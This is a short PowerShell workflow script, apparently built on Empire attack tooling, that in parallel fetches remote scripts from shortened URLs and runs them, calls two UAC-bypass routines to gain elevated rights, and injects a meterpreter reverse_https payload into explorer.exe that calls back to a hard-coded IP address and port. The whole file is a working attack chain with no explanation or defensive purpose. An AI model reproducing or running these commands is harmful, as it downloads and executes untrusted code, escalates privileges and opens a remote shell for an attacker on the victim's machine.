#https://github.com/EmpireProject/Empire/blob/master/data/module_source/code_execution/Invoke-Shellcode.ps1

workflow Test-Workflow
{
    Parallel
    {
        iwr https://goo.gl/x6ZcHM | iex "&" Bypass-UAC -Method UacMethodNetOle32
        iwr https://goo.gl/wxJHHq | iex "&" UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c powershell -C iwr goo.gl/ | iex"-ProcPID (ps -Name mmc).id
        iwr https://goo.gl/UJL3nD | iex "&" Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost 45.77.166.202 -Lport 51000
    }
}
